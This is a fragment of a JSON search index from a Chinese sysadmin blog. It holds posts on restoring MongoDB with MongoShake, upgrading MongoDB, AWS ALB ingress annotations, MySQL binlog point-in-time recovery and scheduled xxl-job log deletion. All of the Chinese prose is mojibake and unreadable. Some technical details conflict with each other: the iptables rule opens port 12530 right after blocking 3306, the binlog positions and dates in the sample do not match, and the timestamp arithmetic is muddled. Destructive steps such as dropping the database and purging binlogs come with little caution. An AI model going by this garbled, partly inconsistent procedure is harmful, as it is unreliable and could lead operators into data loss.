è·Ÿæºåº“è¿™æ—¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œåˆä¸€å¤©è¿‡å»äº†ï¼ŒDocumentæ–‡æ¡£æ˜¯æ¢å¤å®Œæ¯•ï¼ŒIndexåˆæ— æ³•å»ºç«‹ï¼Œå› ä¸ºç”¨æˆ·åå’Œå¯†ç ä¸ä¸€è‡´ï¼ŒFuckï¼\nåˆåŒå’å†æ¬¡å¼€å§‹æ¢å¤ï¼Œè¿™ä¸‹å¤©ä¸‹å¤§å‰äº†ï¼Œç„¶åè¿™è¿˜ä¸ç®—å®Œï¼\nrestoreåï¼Œå…¶å®åˆè¿‡äº†ä¸€å¤©ï¼Œé‚£è¦è¿½å¹³ä¹‹åçš„æ•°æ®ï¼Œå°±å¾—ç”¨ä¸Šå®æ—¶åŒæ­¥å·¥å…·äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯é˜¿é‡Œçš„mongoshake\nä¸‹è½½ï¼š\n1wget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz 2 3tar zxvf mongo-shake-v2.8.5.tgz 4cd mongo-shake-v2.8.5 5wget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf æˆ‘ä»¬éœ€è¦æ³¨æ„collector.confçš„ä»¥ä¸‹åœ°æ–¹ï¼š\n1# æºæ•°æ®åº“ 2mongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin 3# ç›®æ ‡æ•°æ®åº“ 4tunnel.address = mongodb://root:xxxxxxxx@192.168.4.5:27017/?authSource=admin 5 6# åŒæ­¥æ¨¡å¼ï¼Œallè¡¨ç¤ºå…¨é‡+å¢é‡åŒæ­¥ï¼Œfullè¡¨ç¤ºå…¨é‡åŒæ­¥ï¼Œincrè¡¨ç¤ºå¢é‡åŒæ­¥ã€‚ 7# ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®æˆ‘ä»¬ä¸€å¼€å§‹å°±å¯ä»¥ç”¨fullæ¨¡å¼æ¥è¿›è¡ŒåŒæ­¥ï¼Œé‚£ä¸ºä»€ä¹ˆä¸å‘¢ï¼Ÿçœ‹ä¸‹é¢çš„è§£é‡Š 8sync_mode = incr 9 10# é‚£è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå°±æ˜¯å¦‚æœmongoshakeçš„collectorè¿›ç¨‹æ‰äº†ï¼Œæ¯”å¦‚è¢«OOMäº† 11# ä¸‹æ¬¡å†å¯åŠ¨ï¼Œä¼šé‡æ–°å…¨é‡åŒæ­¥è¿˜æ˜¯æ¥ç€å¢é‡åŒæ­¥å‘¢ï¼Ÿ 12# ç­”æ¡ˆæ˜¯ï¼šåŒæ­¥çš„æ—¶å€™ï¼Œcollectorä¼šåœ¨æºåº“å»ºç«‹ä¸€ä¸ªmongoshakeçš„dbï¼Œé‡Œé¢æœ‰ä¸ªè¡¨ckpt_defaultï¼Œé‡Œé¢æ”¾ç€åŒæ­¥ä¿¡æ¯ 13# collectoré‡å¯åä¼šè¯»å–è¿™ä¸ªè¡¨è¿›è¡Œå¢é‡åŒæ­¥ï¼Œå“ªæ€• sync_mode=full 14# æ‰€ä»¥å¦‚æœæƒ³é‡å¯åé‡æ–°å…¨é‡åŒæ­¥ï¼Œé‚£å°±éœ€è¦æ‰‹åŠ¨åˆ äº†è¿™ä¸ªè¡¨ï¼Œæˆ–è€…æ¢ä¸ªè¡¨åï¼Œæ¯”å¦‚æ¢æˆckpt_sync 15 16# é‚£mongoshakeå®é™…æ˜¯æ ¹æ®oplogè¿›è¡ŒåŒæ­¥çš„ï¼Œé‚£å¦‚æœä»¥å‰çš„oplogæœ‰åˆ é™¤ï¼Œæˆ‘ä»¬å°±å¿…é¡»ç”¨dumpå’Œrestoreè¿›è¡Œä¸€æ¬¡å®Œæ•´å¤‡ä»½æ¢å¤ 17# ç„¶åå†è¿›è¡Œè¿½å¹³ï¼Œé‚£åˆšå¼€å§‹æˆ‘ä»¬è®°å½•ä¸‹æ¥çš„æ—¶é—´æˆ³å°±æœ‰ç”¨äº† 18# Sun May 11 06:34:02 PM CST 2025 ä¸‹åˆ16ç‚¹34åˆ† 19# collectorç”¨çš„æ˜¯USTæ—¶é—´ï¼Œæˆ‘ä»¬çš„æ—¶é—´æ˜¯ä¸œå…«åŒºï¼ŒCSTï¼Œæ‰€ä»¥è¦å‡å»8å°æ—¶ï¼Œ16-8=8 20# é‚£å°±æ˜¯ï¼š2025-05-11T08:30:00Z æ—¶é—´ç¨ç¨å‰æ¨ä¸€ç‚¹ï¼Œç„¶åè¿½å¹³æ•°æ® 21 22checkpoint.storage.db = mongoshake 23checkpoint.storage.collection = ckpt_default 24checkpoint.start_position = 2025-05-11T08:30:00Z ç„¶åæ³¨æ„ï¼Œæºåº“å®é™…æ˜¯ä¸ªä»£ç†ï¼Œç›´æ¥è¿çš„è¯ï¼Œæœ‰ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œè€Œmongoshakeæ˜¯å¤Ÿä¸åˆ°è¿™ä¸‰ä¸ªèŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥éœ€è¦å¼ºåˆ¶æ”¹æˆä¸€ä¸ªç›´æ¥è¿æ¥ï¼š\n1mongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026amp;connect=direct ç„¶åå°±å¼€å§‹åŒæ­¥\n1# æ³¨æ„ï¼Œä¸€å®šæ”¾åˆ°screené‡Œ 2screen -L 3 4# verbose éœ€è¦æ˜¯0ï¼Œè®°å½•åˆ°æ–‡æœ¬æ–‡ä»¶ï¼Œä¾¿äºä¹‹åæŒç»­è§‚å¯Ÿ 5./collector.linux -conf=collector.conf -verbose 0 çœ‹æ—¥å¿—æœ‰åŒæ­¥çš„ï¼Œå°±OK\n","date":"2025-05-12","img":"","permalink":"https://rendoumi.com/posts/20250512-mongodb-restore/","series":null,"tags":null,"title":"Mongodb é›†ç¾¤çš„æ¢å¤"},{"categories":null,"content":"mongodb å…¬å¸ç°åœ¨è¿è¡Œçš„ç‰ˆæœ¬æ˜¯mongodb 4.2.19ï¼Œåœ¨å¤„ç†allowDiskUseçš„æ—¶å€™å¤±è´¥\nå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œä¼¼ä¹å¦å¤–ä¸€ä¸ªé›†ç¾¤è·‘çš„æ˜¯5.0.5ï¼Œå°±æ²¡æœ‰é—®é¢˜\né‚£å°±å‡çº§ä¸€ä¸‹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆä¸‹è½½ 5.0.30\n1wget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz ç„¶åè§£å‹å¼„å¥½ï¼Œå‡†å¤‡å¥½mongodb.conf\ndumpä¸‹æ¥è€æ•°æ®ï¼Œä¸åŠ Â·\u0026ndash;quietÂ·çš„å‚æ•°æœ‰å¯èƒ½ä¼šé‡åˆ°EOFçš„é”™è¯¯\n1mkdir mongobackup 2cd mongobackup 3mongodump --quiet ç„¶åæ€æ‰4.2.19ï¼Œå¯åŠ¨5.0.30ï¼ŒæŠŠæ•°æ®å›çŒå›å»ï¼ŒåŒæ ·è¦ç”¨--quietå‚æ•°\n1cd mongobackup 2mongorestore --quiet è¿™æ ·å°±OKäº†ã€‚\næ³¨æ„ï¼Œmongo æ˜¯åƒå†…å­˜å¤§æˆ·ï¼Œå¦‚æœå¤‡ä»½ä¸ä¸‹æ¥ï¼Œæˆ–è€…æ¢å¤ä¸è¿›å»ï¼Œè¯·å¢åŠ å†…å­˜ã€‚\næ›¾æœ‰è¿‡ä¸€æ¬¡ï¼Œ8G-\u0026gt;16G-\u0026gt;32G æ‰æˆåŠŸã€‚\nè€Œä¸”å¿…é¡»ä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œå¤‡ä»½ï¼Œä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œæ¢å¤ï¼Œè®°å¾—å¤‡ä»½ admin æ•°æ®åº“\n1mongodump -d message 2mongorestore --port 37017 --drop --nsInclude=message.* ","date":"2025-01-22","img":"","permalink":"https://rendoumi.com/posts/20250122-mongodb_upgrade/","series":null,"tags":null,"title":"Mongodb å¦‚ä½•å‡çº§"},{"categories":null,"content":"ç®¡ç†äº†ä¸€ä¸ªAWSçš„EKSé›†ç¾¤ï¼Œç”¨çš„æ˜¯ALBçš„è´Ÿè½½å‡è¡¡ï¼Œè¿™ä¸ªè´Ÿè½½å‡è¡¡å’ŒNginxæœ‰åŒºåˆ«ï¼Œæœ‰å¾ˆå¤šç‰¹æ®Šçš„åœ°æ–¹éœ€è¦æ³¨æ„ã€‚\nåŸºæœ¬éœ€è¦å®£å‘Šå¾ˆå¤šç‹¬æœ‰çš„ annotations\nä¸€ã€httpè‡ªåŠ¨è·³è½¬åˆ°https 1 annotations: 2 alb.ingress.kubernetes.io/actions.ssl-redirect: | 3 {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} 4 5...... 6 7 - host: \u0026#39;*.bajie.dev\u0026#39; 8 http: 9 paths: 10 - backend: 11 service: 12 name: ssl-redirect 13 port: 14 name: use-annotation 15 path: / 16 pathType: Prefix æ³¨æ„ï¼Œannotationäº†ä¸Šé¢ä¸€æ¡ï¼Œé‚£ä¹ˆåœ¨LBä¸­ï¼Œhttp 80çš„è§„åˆ™å°±åªå‰©ä¸‹è¿™ä¸€æ¡äº†ï¼Œå‹å€’ä¸€åˆ‡çš„è§„åˆ™ã€‚\nä¹‹åä½ å†annotationåˆ«çš„httpè§„åˆ™ï¼Œä¼šä¸ç”Ÿæ•ˆï¼›ä½ åªèƒ½å»annotition httpsçš„è§„åˆ™ã€‚\näºŒã€wwwé‡å®šå‘ ä¾‹å­ï¼š è¾“å…¥ rendoumi.comï¼Œä¼šè‡ªåŠ¨é‡å®šä¹‰åˆ° www.rendoumi.com 1 annotations: 2 alb.ingress.kubernetes.io/actions.www-redirect: | 3 {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.rendoumi.com\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} 4 5...... 6 7 - host: rendoumi.com 8 http: 9 paths: 10 - backend: 11 service: 12 name: www-redirect 13 port: 14 name: use-annotation 15 path: / 16 pathType: Prefix è¿™ä¸ªæ˜¯ç›´æ¥301è·³è½¬åˆ°httpså»äº†\nä¸‰ã€external-dns ALB çš„ingressæœ‰ä¸ªå¤§å‘ï¼Œé‚£å°±æ˜¯å¦‚æœä½ å¤§åŠ¨ingressï¼Œå‰é¢çš„LBä¼šå‘ç”Ÿå˜åŒ–ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„LBã€‚è¿™ç‚¹éå¸¸è¦å‘½ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°çš„æ—¶å€™ï¼Œå…«æˆ’è¢«è¿«æ”¹æ‰äº†Route53çš„å¥½å¤šæ¡DNSè®°å½•ï¼Œæ“¦çš„\næ‰€ä»¥åŠ¡å¿…æŠŠè¿™ä¸ªåŠ ä¸Šï¼Œé¿å…å¼•èµ·è”åŠ¨ï¼Œåæ­£æ— æ‰€è°“ï¼Œæ²¡è£…external-dnsçš„è¯annotationçš„ä¸èµ·ä½œç”¨\n1 annotations: 2 external-dns.alpha.kubernetes.io/hostname: rendoumi.com,www.rendoumi.com,*.rendoumi.com æŠŠè¦ç®¡ç†çš„åŸŸåç”¨é€—å·åˆ†å¼€\nå››ã€groupå±æ€§ è¿™ä¸ªå°±æ˜¯ä¸Šé¢æ‰€è¯´çš„å¤§æ”¹åŠ¨ï¼ŒåŠ è¿™ä¸ªå±æ€§å¿…ç„¶å¼•èµ·æ›´æ¢LB\nè¿™ä¸ªåœºæ™¯ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œä¸åŒçš„namespaceä¸­çš„ingresséƒ½è¦ç”¨åˆ°åŒä¸€ä¸ªåŸŸå\nè¿™æ ·å°±éº»çƒ¦äº†ï¼Œnginx ingressç®€å•åŠ ä¸ªnamespaceå°±å¯ä»¥äº†ï¼Œalbä¸è¡Œ\néœ€è¦æ˜¾å¼å£°æ˜ group å±æ€§\n1 annotations: 2 alb.ingress.kubernetes.io/group.name: rendoumi 3 alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; æ³¨æ„ï¼Œä¸¤ä¸ªå±æ€§åŠ¡å¿…åœ¨ä¸€èµ·ï¼Œ orderç¼ºçœæ˜¯0ï¼Œæœ€å¤§1000\nè¿™æ ·LBä¼šæŠŠä¸åŒnsä¸­çš„ingressèšåˆæˆä¸€ä¸ªLBæ¥ä½¿ç”¨\næœ€åï¼Œç»™ä¸ªå®Œå…¨çš„ä¾‹å­ï¼š\n1apiVersion: networking.k8s.io/v1 2kind: Ingress 3metadata: 4 annotations: 5 alb.ingress.kubernetes.io/actions.ssl-redirect: | 6 {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} 7 alb.ingress.kubernetes.io/actions.www-redirect: | 8 {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.bajie.dev\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} 9 alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:000007118436:certificate/xxxxa910-46c9-4680-929a-99996deb98df 10 alb.ingress.kubernetes.io/group.name: bajie 11 alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; 12 alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTP\u0026#34;: 80}, {\u0026#34;HTTPS\u0026#34;:443}]\u0026#39; 13 alb.ingress.kubernetes.io/scheme: internet-facing 14 alb.ingress.kubernetes.io/ssl-policy: ELBSecurityPolicy-TLS-1-1-2017-01 15 alb.ingress.kubernetes.io/ssl-redirect: \u0026#34;443\u0026#34; 16 alb.ingress.kubernetes.io/subnets: subnet-99996c43cb399f55c,subnet-9999c9681d11a3323,subnet-99999874db9639a77 17 alb.ingress.kubernetes.io/target-type: ip 18 external-dns.alpha.kubernetes.io/hostname: bajie.dev,www.bajie.dev,*.bajie.dev 19 namespace: default 20spec: 21 ingressClassName: alb 22 rules: 23 - host: official.bajie.dev 24 http: 25 paths: 26 - backend: 27 service: 28 name: dc-official-client 29 port: 30 number: 3000 31 path: / 32 pathType: Prefix 33 - host: bajie.dev 34 http: 35 paths: 36 - backend: 37 service: 38 name: www-redirect 39 port: 40 name: use-annotation 41 path: / 42 pathType: Prefix 43 - host: \u0026#39;*.bajie.dev\u0026#39; 44 http: 45 paths: 46 - backend: 47 service: 48 name: ssl-redirect 49 port: 50 name: use-annotation 51 path: / 52 pathType: Prefix 53 tls: 54 - hosts: 55 - bajie.dev 56 - www.bajie.dev 57 - official.bajie.dev æˆ‘ä»¬åœ¨å¦å¤–ä¸€ä¸ªnamespace annotatitonä¸€ä¸ª ingresså°±æ˜¯è¿™æ ·çš„\n1apiVersion: networking.k8s.io/v1 2kind: Ingress 3metadata: 4 name: grafana 5 namespace: prometheus 6 annotations: 7 alb.ingress.kubernetes.io/group.name: bajie 8 alb.ingress.kubernetes.io/group.order: \u0026#39;10\u0026#39; 9 alb.ingress.kubernetes.io/scheme: internet-facing 10 alb.ingress.kubernetes.io/target-type: ip 11 alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:533267118436:certificate/e6c3a910-46c9-4680-929a-d60d6deb98df 12 external-dns.alpha.kubernetes.io/hostname: grafana.bajie.dev 13spec: 14 ingressClassName: alb 15 rules: 16 - host: grafana.bajie.dev 17 http: 18 paths: 19 - path: / 20 pathType: Prefix 21 backend: 22 service: 23 name: stable-grafana 24 port: 25 number: 80 26 tls: 27 - hosts: 28 - grafana.bajie.dev æ³¨æ„ orderï¼Œgrafanaçš„orderæ˜¯10ï¼Œè€Œä¸Šé¢æ˜¯100ï¼Œæ‰€ä»¥grafanaçš„è®°å½•ä¼šå‡ºç°åœ¨*ä¹‹å‰ï¼Œå¦åˆ™ï¼Œå°±é¦–å…ˆè¢« æ˜Ÿå· æ‹¦æˆªï¼Œç„¶åæ‰åˆ° grafanaçš„è·¯å¾„ï¼Œå°±ä¸å¯¹äº†ã€‚\n","date":"2025-01-20","img":"","permalink":"https://rendoumi.com/posts/20250120-aws_alb_ingress/","series":null,"tags":null,"title":"AWS Alb è´Ÿè½½å‡è¡¡åšingressçš„æ³¨æ„äº‹é¡¹"},{"categories":null,"content":"åŒäº‹ä¸Šçº¿ï¼ŒæŠŠæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬æ”¹äº†åã€‚ç»“æœå¯¼è‡´ä¸Šçº¿æŠŠåº“è¡¨çš„æ•°æ®å…¨ç»™é‡æ–°åˆå§‹åŒ–äº†ã€‚è¿™ä¸‹äº‹æ¥äº†ï¼Œæ¢å¤åº“è¡¨ã€‚\nä¹‹å‰ç”¨è¿‡é˜¿é‡Œäº‘çš„åº“è¡¨æ¢å¤ï¼Œéå¸¸ç®€æ´ï¼Œé‚£è¿™æ¬¡ä¹Ÿç…§çŒ«ç”»è™å­¦ä¸€å›ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¿å­˜ç°åœ¨çš„è®°å½•ï¼š\næŠŠæ‰€æœ‰ç›¸å…³çš„binlogæ‹·è´åˆ°ä¸€ä¸ªå¤‡ä»½ç›®å½•ä¿å­˜ã€‚\näºŒã€æœ€å¥½æ–°å»ºä¸€ä¸ªmysqlå®ä¾‹ï¼š\né˜¿é‡Œç¡®å®äº‹æ–°èµ·äº†ä¸€ä¸ªå®ä¾‹ï¼Œé¿å…æ“ä½œå¯¹æ—§å®ä¾‹é€ æˆå½±å“ã€‚\næˆ‘ä»¬å®æˆ˜ä¸­å¯èƒ½æ²¡å¿…è¦ï¼Œä½†ä¹Ÿè¦å°é”æ•°æ®åº“çš„è¯»å†™ï¼š\n1iptables -I INPUT -p tcp --dport 3306 -j DROP 2 3# æŠŠè‡ªå·±æ”¾é€šï¼Œåç»­å¯èƒ½è‡ªå·±è¦è¿›è¡Œ mysql æˆ– mysqldump çš„æ“ä½œ 4iptables -I INPUT -s 127.0.0.1/32 -p tcp --dport 12530 -j ACCEPT ä¸‰ã€è§£æbinlog\næˆ‘ä»¬éœ€è¦æŠŠé‡æ”¾æ—¥å¿—æ‹¿å‡ºæ¥ï¼š\n1mysqlbinlog --start-datetime=\u0026#34;2025-01-02 14:40:00\u0026#34; --stop-datetime=\u0026#34;2025-01-02 14:50:00\u0026#34; --verbose binlog.000009 |grep -i -C15 \u0026#34;drop table\u0026#34;|more 2 3mysqlbinlog binlog.000009 --stop-position=260734003 --database=work_oa \u0026gt; 9.sql 1æ³¨æ„ï¼Œåˆ†æï¼šçœ‹åˆ° at 260734003 ä¸‹é¢æœ‰ä¸ª drop table ï¼Œè¯´æ˜æ˜¯åœ¨ 260734003 ä¹‹åå‘ç”Ÿäº† drop table æ“ä½œ 2æ‰€ä»¥ï¼Œå›æ”¾åˆ°260734003å°±å¯ä»¥äº†ã€‚ä¹‹åã€ä¹‹åã€ä¹‹åæ‰æ“ä½œçš„ï¼ï¼ï¼ 3 4/*!80014 SET @@session.original_server_version=80019*//*!*/; 5/*!80014 SET @@session.immediate_server_version=80019*//*!*/; 6SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; 7# at 260734003 8#200311 20:06:20 server id 1 end_log_pos 355 CRC32 0x2fc1e5ea Query\tthread_id=16\texec_time=0\terror_code=0 9SET TIMESTAMP=1583971580/*!*/; 10SET @@session.pseudo_thread_id=16/*!*/; 11SET @@session.foreign_key_checks=1, @@session.sql_auto_is_null=0, @@session.unique_checks=1, @@session.autocommit=1/*!*/; 12SET @@session.sql_mode=1168113696/*!*/; 13SET @@session.auto_increment_increment=1, @@session.auto_increment_offset=1/*!*/; 14/*!\\C utf8mb4 *//*!*/; 15SET @@session.character_set_client=255,@@session.collation_connection=255,@@session.collation_server=255/*!*/; 16SET @@session.lc_time_names=0/*!*/; 17SET @@session.collation_database=DEFAULT/*!*/; 18/*!80011 SET @@session.default_collation_for_utf8mb4=255*//*!*/; 19DROP TABLE `pets`.`cats` /* generated by server */ 20/*!*/; 21# at 260734009 22#200311 20:07:48 server id 1 end_log_pos 434 CRC32 0x123d65df Anonymous_GTID\tlast_committed=1\tsequence_number=2\trbr_only=no\toriginal_committed_timestamp=1583971668462467\timmediate_commit_timestamp=1583971668462467\ttransaction_length=473 23# original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) 24# immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) 25/*!80001 SET @@session.original_commit_timestamp=1583971668462467*//*!*/; 26/*!80014 SET @@session.original_server_version=80019*//*!*/; 27/*!80014 SET @@session.immediate_server_version=80019*//*!*/; 28SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; 29# at 260734188 30#200311 20:07:48 server id 1 end_log_pos 828 CRC32 0x57fac9ac Query\tthread_id=16\texec_time=0\terror_code=0\tXid = 217 31use `pets`/*!*/; 32SET TIMESTAMP=1583971668/*!*/; 33/*!80013 SET @@session.sql_require_primary_key=0*//*!*/; 34CREATE TABLE dogs æˆ‘ä»¬è¿˜æ˜¯å…ˆæ‰¾åˆ° binlog ä¸­ drop table ä¹‹ç±»çš„æ“ä½œå­—æ ·ï¼Œç„¶åç¡®å®š position åï¼ŒæŠŠ binlog.00009 ä¸­ä¹‹å‰çš„ log å¯¼å‡ºã€‚\nåˆ«å¿˜è®°äº†ï¼Œ å‰é¢è¿˜æœ‰8ä¸ªbinlog\n1mysqlbinlog -d work_oa binlog.000001 \u0026gt; 1.sql 2mysqlbinlog -d work_oa binlog.000002 \u0026gt; 2.sql 3mysqlbinlog -d work_oa binlog.000003 \u0026gt; 3.sql 4mysqlbinlog -d work_oa binlog.000004 \u0026gt; 4.sql 5mysqlbinlog -d work_oa binlog.000005 \u0026gt; 5.sql 6mysqlbinlog -d work_oa binlog.000006 \u0026gt; 6.sql 7mysqlbinlog -d work_oa binlog.000007 \u0026gt; 7.sql 8mysqlbinlog -d work_oa binlog.000008 \u0026gt; 8.sql ç„¶åè¿˜è¦çœ‹ *.sql çš„å¤§å°ï¼Œå‘ç°éƒ½æ˜¯1.7Gï¼Œ1.6G\nå››ã€æ¢å¤\næ³¨æ„ä¸Šä¸€èŠ‚å…³æ³¨çš„æ–‡ä»¶å¤§å°ã€‚æˆ‘ä»¬éœ€è¦ä¿®æ”¹2ä¸ªåœ°æ–¹ï¼š\n1ã€æœåŠ¡å™¨ï¼Œbinlogå¯¼å‡ºçš„æ–‡ä»¶ï¼Œå¯¼å…¥æœåŠ¡å™¨çš„æ—¶å€™æ•°æ®åŒ…ä¼šéå¸¸å¤§ï¼Œæ‰€ä»¥1.7Gæ–‡ä»¶ï¼Œæœ€å¥½æ”¾å¤§åˆ°2G\n1cat /etc/my.cnf 2[mysqld] 3max_allowed_packet=2048M 2ã€å®¢æˆ·ç«¯å¯¼å…¥\n1# å› ä¸ºæ˜¯ç›´æ¥åœ¨è€åº“ä¸Šæ“ä½œï¼Œæ‰€ä»¥å¿…é¡»å…ˆå¹²æ‰åº“ 2drop database work_oa 3 4# æ¢å¤ 5mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 1.sql 6mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 2.sql 7mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 3.sql 8mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 4.sql 9mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 5.sql 10mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 6.sql 11mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 7.sql 12mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 8.sql 13mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 9.sql è¿™æ ·å°±æ¢å¤å®Œäº†ã€‚å¦‚æœæ˜¯åœ¨é˜¿é‡Œäº‘ï¼Œé‚£å°±æ˜¯æ¢å¤åˆ°äº†ä¸€ä¸ªæ–°å®ä¾‹çš„æ–°åº“é‡Œï¼Œç„¶ååœ¨æŠŠåº“è¡¨å¯¼å‡ºï¼Œå†å¯¼å…¥åˆ°è€åº“ä¸­ï¼Œå°±æ˜¯ä¸€ä¸ªå®Œç¾çš„æ¢å¤äº†ã€‚\nå–„åäº‹å®œï¼š\nä¸€å®šè¦åšä¸ªfull backupï¼š\n1mysqldump -uroot -p -h 127.0.0.1 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 --all-databases \u0026gt; all-20250103.sql åšå®ŒåæŸ¥çœ‹ all-20250103.sql\nè¯´æ˜è¿™ä¸ªå¤‡ä»½æ˜¯ä» binlog.000031 å¼€å§‹çš„ï¼Œä¹‹å‰çš„éƒ½å¯ä»¥ä¸è¦äº†ï¼Œsoï¼Œåˆ é™¤ä¹‹å‰çš„ï¼Œåªä¿ç•™000031ä¹‹åçš„ï¼š\n1PURGE BINARY LOGS TO \u0026#39;binlog.000031\u0026#39;; ","date":"2025-01-03","img":"","permalink":"https://rendoumi.com/posts/20250103-msyql_restore/","series":null,"tags":null,"title":"Mysqlçš„æŸä¸ªè¡¨æ¢å¤åˆ°æŸä¸€ä¸ªæ—¶é—´ç‚¹çš„æ“ä½œ"},{"categories":null,"content":"xxl-jobçš„æ—¥å¿—æ•°æ®å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå‹æ ¹å°±æ²¡æœ‰æ¸…ç†è¿‡ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¥å®šæ—¶åˆ é™¤æ— ç”¨çš„åºŸæ•°æ®å§ï¼š\né¦–å…ˆè¦ç¡®è®¤å®šæ—¶ä»»åŠ¡å¼€å…³å·²ç»æ‰“å¼€äº†\n1show variables like \u0026#39;event_scheduler\u0026#39;; 2Onè¡¨ç¤ºå¼€å¯ ç„¶ååˆ°æŒ‡å®šçš„åº“ä¸‹ï¼Œuse k8s_xxl_job\n1CREATE EVENT delete_k8s_xxl_log 2ON SCHEDULE EVERY 1 DAY 3DO 4DELETE FROM xxl_job_log WHERE trigger_time \u0026lt; CURRENT_TIMESTAMP - INTERVAL 7 DAY; 5 6ä¿ç•™ä»Šå¤©çš„æ•°æ®ï¼Œä»¥åŠå‰7å¤©çš„è€æ•°æ®ã€‚ æŸ¥çœ‹ä»¥åŠç¼–è¾‘å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤ï¼š\n1#æŸ¥çœ‹ 2show events; 3 4#æŸ¥çœ‹ç»†èŠ‚ 5SHOW CREATE EVENT delete_k8s_xxl_log 6 7#ç¼–è¾‘ 8ALTER EVENT delete_k8s_xxl_log 9ON SCHEDULE EVERY 1 DAY 10DO 11BEGIN 12 -- åœ¨è¿™é‡Œæ·»åŠ ä½ æƒ³è¦æ‰§è¡Œçš„æ“ä½œ 13END; ","date":"2024-03-20","img":"","permalink":"https://rendoumi.com/posts/20240320-mysql_delete_xxllog/","series":null,"tags":null,"title":"è®¾ç½®Mysqlè‡ªåŠ¨å®šæ—¶åˆ é™¤xxljobçš„æ—¥å¿—æ•°æ®"},{"categories":null,"content":"å…¶å®æˆ‘ä»¬ç”¨çš„æ˜¯yearningæ¥ç®¡ç† MySQL æ•°æ®åº“å˜æ›´éœ€æ±‚çš„ï¼Œä½†æ˜¯ï¼Œç±»ä¼¼ Oracle æˆ–è€… 